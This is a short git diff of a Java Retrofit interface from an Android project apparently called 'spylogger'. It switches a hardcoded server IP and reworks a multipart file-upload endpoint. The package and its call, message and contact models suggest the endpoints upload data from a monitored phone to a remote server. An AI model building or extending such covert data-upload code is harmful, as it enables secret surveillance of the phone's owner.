@@ -2,6 +2,7 @@ package com.gravatasufoca.spylogger.services;
 
 import com.gravatasufoca.spylogger.model.Ligacao;
 import com.gravatasufoca.spylogger.model.Mensagem;
+import com.gravatasufoca.spylogger.model.TipoAcao;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
 import com.gravatasufoca.spylogger.vos.ContatoVO;
@@ -12,9 +13,10 @@ import com.gravatasufoca.spylogger.vos.UsuarioVO;
 
 import java.util.List;
 
-import okhttp3.RequestBody;
+import okhttp3.MultipartBody;
 import retrofit2.Call;
 import retrofit2.http.Body;
+import retrofit2.http.Header;
 import retrofit2.http.Multipart;
 import retrofit2.http.POST;
 import retrofit2.http.Part;
@@ -26,8 +28,8 @@ import retrofit2.http.Path;
 
 public interface SendDataInterface {
 
-//    String ip="172.24.35.147";
-    String ip="192.168.1.118";
+    String ip="172.24.35.147";
+//    String ip="192.168.1.118";
 
     String apiUrl="http://"+ip+"/smartlog/api/v1/";
 
@@ -45,7 +47,7 @@ public interface SendDataInterface {
 
     @Multipart
     @POST(apiUrl+"receber/arquivo")
-    Call<Boolean> enviarArquivo(@Part("arquivo\"; filename=\"arquivo\" ") RequestBody arquivo,@Part("envioArquivoVo") EnvioArquivoVO envioArquivoVO);
+    Call<Boolean> enviarArquivo(@Part MultipartBody.Part arquivo, @Header("tipoAcao") TipoAcao tipoAcao);
 
     @POST(apiUrl+"fcm/conectado")
     Call<Boolean> enviarAtivo(@Body EnvioArquivoVO envioArquivoVO);
